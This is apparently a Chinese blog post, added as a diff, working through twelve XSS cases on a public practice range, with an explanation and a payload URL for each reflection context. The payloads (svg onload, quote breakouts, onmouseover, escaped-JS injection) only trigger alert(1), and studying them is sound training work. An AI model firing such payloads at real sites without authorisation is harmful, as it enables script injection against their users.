@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html>
+  
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <meta name="author" content="FengHLZ">
+  
+  
+  <title>XSS练习笔记 | xyz|All</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="Web安全,">
+  
+
+  
+  <meta name="description" content="一个基础的、面向新手的XSS靶场">
+
+  
+
+  <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.1/dist/av-min.js" async></script>
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+    <script src="//unpkg.com/valine/dist/Valine.min.js" async></script>
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"mB9CftyvuDc5gN6R44KukJtw-gzGzoHsz","appkey":"gRRwrnOXHglzMIz3blENWVJV","comment":true,"count":true},
+    welcome: {"enable":true,"interval":30},
+    start_time: "2018-07-09",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "FengHLZ",
+    share: {"twitter":true,"facebook":true,"weibo":true,"qq":true,"wechat":true},
+    mathjax: true,
+    page_type: ""
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+<script src="/js/jquery.min.js"></script>
+
+  
+    <link rel="icon" href="/images/siteimage.jpg">
+    <link rel="apple-touch-icon" href="/images/siteimage.jpg">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">FengHLZ.xyz</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | Know it - Do it</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+        <a href="/friends/" target="_self">友链</a>
+      
+        <a href="/about/index.html" target="_self">关于</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/FengHLZ" target="_blank">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2019-03-25
+    </span>
+    
+      <span>
+        | <a href="/categories/Web安全/"><i class="fa fa-bookmark"></i>Web安全</a>
+      </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    XSS练习笔记
+  </h1>
+  
+  <article class="passage-article">
+    <h1 id="XSS练习笔记"><a href="#XSS练习笔记" class="headerlink" title="XSS练习笔记"></a>XSS练习笔记</h1><p>XSS基础知识：<br><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener">https://portswigger.net/web-security/cross-site-scripting</a></p>
+<p>练习靶场：<br><a href="https://brutelogic.com.br/xss.php" target="_blank" rel="noopener">https://brutelogic.com.br/xss.php</a></p>
+<p>官方WP：<br><a href="https://brutelogic.com.br/blog/the-7-main-xss-cases-everyone-should-know/" target="_blank" rel="noopener">https://brutelogic.com.br/blog/the-7-main-xss-cases-everyone-should-know/</a></p>
+<h2 id="1-URL-Reflection"><a href="#1-URL-Reflection" class="headerlink" title="1. URL Reflection"></a>1. URL Reflection</h2><p>当URL以某种方式显示在源代码中时，我们可以添加自己的<code>XSS向量</code>或者<code>payload</code>。对于PHP页面，可以<strong>使用斜杠字符</strong> <code>/</code> 在页面名称之后添加任何内容（不更改它）。</p>
+<p><img src="rAdL61s.png" alt><br>如上图，URL的值会显示在<code>action</code>属性中<br>payload：<code>http://brutelogic.com.br/xss.php/&quot;&gt;&lt;svg onload=alert(1)&gt;</code></p>
+<h2 id="2-Simple-HTMLi-HTML-injection"><a href="#2-Simple-HTMLi-HTML-injection" class="headerlink" title="2. Simple HTMLi (HTML injection)"></a>2. Simple HTMLi (HTML injection)</h2><p>输入的内容在现有标签之间。没有过滤任何东西。<br><img src="zAUOs5P.png" alt><br>如上图，<code>guest</code>的值就是参数<code>a</code>的值。<br>payload：<code>http://brutelogic.com.br/xss.php?a=&lt;svg onload=alert(1)&gt;</code></p>
+<h2 id="3-Inline-HTMLi-Double-Quotes"><a href="#3-Inline-HTMLi-Double-Quotes" class="headerlink" title="3. Inline HTMLi (Double Quotes)"></a>3. Inline HTMLi (Double Quotes)</h2><p>可以使用<code>&quot;&gt;</code>将其闭合。<br><img src="FAD1ytQ.png" alt><br>payload：<code>http://brutelogic.com.br/xss.php?b1=&quot;&gt;&lt;svg onload=alert(1)&gt;</code></p>
+<h2 id="4-Inline-HTMLi-Single-Quotes"><a href="#4-Inline-HTMLi-Single-Quotes" class="headerlink" title="4. Inline HTMLi (Single Quotes)"></a>4. Inline HTMLi (Single Quotes)</h2><p>跟上面一样，使用<code>&#39;&gt;</code>进行闭合<br><img src="DRvisKI.png" alt><br>payload：<code>https://brutelogic.com.br/xss.php?b2=&#39;&gt;&lt;svg onload=alert(1)&gt;</code></p>
+<h2 id="5-Inline-HTMLi-No-Tag-Breaking-Double-Quotes"><a href="#5-Inline-HTMLi-No-Tag-Breaking-Double-Quotes" class="headerlink" title="5. Inline HTMLi - No Tag Breaking (Double Quotes)"></a>5. Inline HTMLi - No Tag Breaking (Double Quotes)</h2><p>该内联HTML注入中转义了<code>&gt;</code>不能像上一关那样使用<code>&quot;&gt;</code>闭合</p>
+<p><img src="Vue05Vr.png" alt></p>
+<p>可以<code>&quot;</code>闭合后，增加一个<code>onmouseover</code>属性<br>payload：<code>http://brutelogic.com.br/xss.php?b3=&quot; onmouseover=alert(1)//</code></p>
+<blockquote>
+<p>双斜线注释掉<code>&quot;</code></p>
+</blockquote>
+<p>演示结果：<br><img src="BS0cNvE.png" alt></p>
+<p>也可以使用<code>&quot;alert(1)&quot;</code><br>payload：<code>http://brutelogic.com.br/xss.php?b3=&quot; onmouseover=&quot;alert(1)</code></p>
+<p>演示结果：<br><img src="v21UcYg.png" alt></p>
+<h2 id="6-Inline-HTMLi-No-Tag-Breaking-Single-Quotes"><a href="#6-Inline-HTMLi-No-Tag-Breaking-Single-Quotes" class="headerlink" title="6. Inline HTMLi - No Tag Breaking (Single Quotes)"></a>6. Inline HTMLi - No Tag Breaking (Single Quotes)</h2><p>同上<br>payload：<code>http://brutelogic.com.br/xss.php?b4=&#39; onmouseover=alert(1)//</code><br>payload：<code>http://brutelogic.com.br/xss.php?b4=&#39; onmouseover=&#39;alert(1)</code></p>
+<h2 id="7-HTMLi-in-Js-Block-Single-Quotes"><a href="#7-HTMLi-in-Js-Block-Single-Quotes" class="headerlink" title="7. HTMLi in Js Block (Single Quotes)"></a>7. HTMLi in Js Block (Single Quotes)</h2><p>输入有时会进入一个javascript块（脚本标签），通常是代码的某个变量的值。<br>但是因为<strong>HTML标签在浏览器的解析中具有优先权</strong>，所以我们可以简单地终止JS块并插入新标签。</p>
+<p><img src="JKhLB3x.png" alt></p>
+<p>payload：<code>http://brutelogic.com.br/xss.php?c1=&lt;/script&gt;&lt;svg onload=alert(1)&gt;</code></p>
+<h2 id="8-HTMLi-in-Js-Block-Double-Quotes"><a href="#8-HTMLi-in-Js-Block-Double-Quotes" class="headerlink" title="8. HTMLi in Js Block (Double Quotes)"></a>8. HTMLi in Js Block (Double Quotes)</h2><p>同上<br>payload：<code>http://brutelogic.com.br/xss.php?c2=&lt;/script&gt;&lt;svg onload=alert(1)&gt;</code></p>
+<h2 id="9-Simple-Js-Injection-Single-Quotes"><a href="#9-Simple-Js-Injection-Single-Quotes" class="headerlink" title="9. Simple Js Injection (Single Quotes)"></a>9. Simple Js Injection (Single Quotes)</h2><p>跟上一关的情况类似，输入的值显示在JS代码块中，但是过滤了<code>&lt;</code>，无法使用<code>&lt;/script&gt;</code>闭合JS代码块。<br>所以要进行的是注入javascript代码，并且注意语法。方法是<strong>连接</strong>我们想要执行的代码，使用<code>-</code>连接。单引号进行闭合。</p>
+<p>payload：<code>http://brutelogic.com.br/xss.php?c3=&#39;-alert(1)-&#39;</code></p>
+<p>演示结果：<br><img src="ssLX7bt.png" alt></p>
+<h2 id="10-Simple-Js-Injection-Double-Quotes"><a href="#10-Simple-Js-Injection-Double-Quotes" class="headerlink" title="10. Simple Js Injection (Double Quotes)"></a>10. Simple Js Injection (Double Quotes)</h2><p>同上<br>payload：<code>http://brutelogic.com.br/xss.php?c4=&quot;-alert(1)-&quot;</code></p>
+<h2 id="11-Escaped-Js-Injection-Single-Quotes"><a href="#11-Escaped-Js-Injection-Single-Quotes" class="headerlink" title="11. Escaped Js Injection (Single Quotes)"></a>11. Escaped Js Injection (Single Quotes)</h2><p>该题中，对输入的<code>&#39;</code>进行了转义：<code>&#39;</code>–&gt;<code>\&#39;</code>，就直接输出了<code>&#39;</code>，而无法注入。<br>可以输入在<code>&#39;</code>前输入<code>\</code>，使得转义后变成<code>\\&#39;</code>，那么最终输出的值为<code>\</code>，而<code>&#39;</code>不作为值。必要时需要使用<code>//</code>注释掉后面多余的字符。<br>payload：<code>http://brutelogic.com.br/xss.php?c5=\&#39;-alert(1)//</code></p>
+<p>演示结果：<br><img src="ZsdyJbm.png" alt></p>
+<h2 id="12-Escaped-Js-Injection-Double-Quotes"><a href="#12-Escaped-Js-Injection-Double-Quotes" class="headerlink" title="12. Escaped Js Injection (Double Quotes)"></a>12. Escaped Js Injection (Double Quotes)</h2><p>同上</p>
+<p>payload：<code>http://brutelogic.com.br/xss.php?c6=\&quot;-alert(1)//</code></p>
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS练习笔记"><span class="toc-text">XSS练习笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-URL-Reflection"><span class="toc-text">1. URL Reflection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Simple-HTMLi-HTML-injection"><span class="toc-text">2. Simple HTMLi (HTML injection)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Inline-HTMLi-Double-Quotes"><span class="toc-text">3. Inline HTMLi (Double Quotes)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Inline-HTMLi-Single-Quotes"><span class="toc-text">4. Inline HTMLi (Single Quotes)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Inline-HTMLi-No-Tag-Breaking-Double-Quotes"><span class="toc-text">5. Inline HTMLi - No Tag Breaking (Double Quotes)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-Inline-HTMLi-No-Tag-Breaking-Single-Quotes"><span class="toc-text">6. Inline HTMLi - No Tag Breaking (Single Quotes)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-HTMLi-in-Js-Block-Single-Quotes"><span class="toc-text">7. HTMLi in Js Block (Single Quotes)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-HTMLi-in-Js-Block-Double-Quotes"><span class="toc-text">8. HTMLi in Js Block (Double Quotes)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-Simple-Js-Injection-Single-Quotes"><span class="toc-text">9. Simple Js Injection (Single Quotes)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-Simple-Js-Injection-Double-Quotes"><span class="toc-text">10. Simple Js Injection (Double Quotes)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-Escaped-Js-Injection-Single-Quotes"><span class="toc-text">11. Escaped Js Injection (Single Quotes)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-Escaped-Js-Injection-Double-Quotes"><span class="toc-text">12. Escaped Js Injection (Double Quotes)</span></a></li></ol></li></ol>
+  </div>
+</aside>
+  
+    <aside class="passage-copyright">
+      <div>本文作者: FengHLZ</div>
+      
+        <div>
+          原文链接: 
+          <a href="" target="_blank">https://www.fenghlz.xyz/passages/2019-03-25-XSS练习笔记/</a>
+        </div>
+      
+      <div>
+        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
+      </div>
+    </aside>
+  
+  
+</div>
+
+    </main>
+    
+      <div class="site-comment-contanier">
+  <p id="site-comment-info">
+    <i class="fa fa-spinner fa-spin"></i> 评论加载中
+  </p>
+  <div id="site-comment">
+  </div>
+</div>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+      <div class="site-footer-col">
+        <h5 class="site-footer-title">博客推荐</h5>
+        
+          <span class="site-footer-item">
+            <a href="https://xin-tan.com/" target="_blank">GodBMW</a>
+          </span>
+        
+      </div>
+    
+      <div class="site-footer-col">
+        <h5 class="site-footer-title">在线工具</h5>
+        
+          <span class="site-footer-item">
+            <a href="https://www.ilovepdf.com/zh-cn" target="_blank">iLovePDF</a>
+          </span>
+        
+          <span class="site-footer-item">
+            <a href="https://www.iloveimg.com/zh-cn" target="_blank">iLoveIMG</a>
+          </span>
+        
+      </div>
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+      <div class="site-footer-info">
+        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
+      </div>
+    
+    
+      <div class="site-footer-info">
+        <i class="fa fa-at"></i> Email: 2362929771@qq.com
+      </div>
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https:/godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content" style="height:55%;width:40%;">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control"/>
+      </div>
+      <div class="site-layer-reward" id="site-layer-reward" style="display: none;">
+        
+          <div>
+            <img src="/images/wechatpay.png" alt="WeChat">
+            
+              <p>WeChat</p>
+            
+          </div>
+        
+          <div>
+            <img src="/images/alipay.jpg" alt="AliPay">
+            
+              <p>AliPay</p>
+            
+          </div>
+        
+      </div>
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+    <div id="local-search-result" style="height:50%;display:none;"></div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div></div>
+  <div class="bottom-bar-left">
+    <a href="/passages/2019-6-12-对本地三个MySQL数据库进行管理/" data-enable="true">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/passages/Code-Breaking2018/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+      <a href="#site-comment" data-enable="true">
+        <i class="fa fa-commenting"></i>
+      </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    <a href="javascript:void(0);" id="site-reward">
+      <i class="fa fa-thumbs-up"></i>
+    </a>
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+    <a id="share-btn-twitter" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-twitter"></i>
+    </a>
+  
+  
+    <a id="share-btn-facebook" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-facebook"></i>
+    </a>
+  
+  
+    <a id="share-btn-weibo" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-weibo"></i>
+    </a>
+  
+  
+    <a id="share-btn-qq" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-qq"></i>
+    </a>
+  
+  
+    <a id="share-btn-wechat" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-wechat"></i>
+    </a>
+  
+</div>
+    
+  <script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+  <script async>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', '');
+  </script>
+
+
+
+  <script async>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+  </script>
+
+
+
+  <script async>
+    (function(){
+    var src = (document.location.protocol == "http:") ? "http://js.passport.qihucdn.com/11.0.1.js?":"https://jspassport.ssl.qhimg.com/11.0.1.js?";
+    document.write('<script src="' + src + '" id="sozz"><\/script>');
+    })();
+  </script>
+
+
+  </body>
+</html>
